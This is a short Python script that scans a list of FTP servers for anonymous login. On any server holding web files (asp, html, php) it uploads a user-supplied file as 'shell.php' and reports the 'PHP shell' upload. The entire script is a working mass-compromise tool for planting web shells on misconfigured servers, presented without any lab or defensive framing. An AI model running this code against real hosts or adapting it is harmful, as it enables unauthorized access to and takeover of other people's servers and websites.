#!/usr/bin/env python3
'''
FTP client that looks for anonymous enabled FTP servers.
If a server with anonymous login is found and it contains file with the
web_files extension.
It uploads a script passed as argument.
'''
import argparse
import socket
import sys
import ftplib
sys.path.append('../')
import mypack.fileops as fileops

def ftp_upload_file(client, include_fname, dest_fname):
    client.storlines('STOR ' + dest_fname, open(include_fname))

def get_web_files(client):
    ''' Given an FTP client, it performs a list command and returns the list
    of files found.
    '''
    web_ext = ['asp', 'html', 'htm', 'php']
    web_files = []
    ftp_files = client.nlst()
    web_files = [fname for fname in ftp_files 
                 for ext in web_ext if fname.__contains__(ext)]
    return (client, web_files)

def ftp_anon_conn(ftp_site):
    ''' Function that attempts to establish a FTP anonymous connection.
    Returns client hostname, ftp_client, error_code
    ftp_client and error_code are mutually exclusive
    '''
    try:
        client = ftplib.FTP(timeout=5)
        client.connect(ftp_site)
        client.login('anonymous', 'user@host.com')
    except ConnectionRefusedError:
        return client.host, ConnectionRefusedError
    except socket.gaierror:
        return client.host, socket.gaierror
    except NameError:
        return client.host, NameError
    except ftplib.error_perm:
        return client.host, ftplib.error_perm
    except socket.timeout:
        return client.host, socket.timeout
    else:
        return client.host, client
    
def main():
    parser = argparse.ArgumentParser(description='''Given a list of FTP
                                     servers. Looks for anonymous login
                                     enabled servers.''')
    parser.add_argument('-f', '--file', help='''File containing list of FTP
                        servers to read from.''', required=True)
    parser.add_argument('-i', '--upload', help='''File to upload to the FTP
                        server, if a web file is found.''', required=True)
    args = parser.parse_args()
    ftp_fname = args.file
    include_fname= args.upload
    dest_fname = 'shell.php'
    ftp_anons = []

    f_reader = fileops.FileReader(ftp_fname)
    host_result = [ftp_anon_conn(ftp_site) for ftp_site in f_reader]
    host_webfile_list = [get_web_files(result) for host, result
                         in host_result if isinstance(result,ftplib.FTP)]
    for client, web_files in host_webfile_list:
        print('''[+] Found anonymous FTP server on {}
                    [-] Web files found: {}'''.format(client.host, web_files))
        if web_files:
            ftp_upload_file(client, include_fname, dest_fname)
            print('''   [!] Uploaded PHP shell file: {} to
                   server {}'''.format(dest_fname, client.host))
        client.close()

if __name__ == '__main__':
    main()
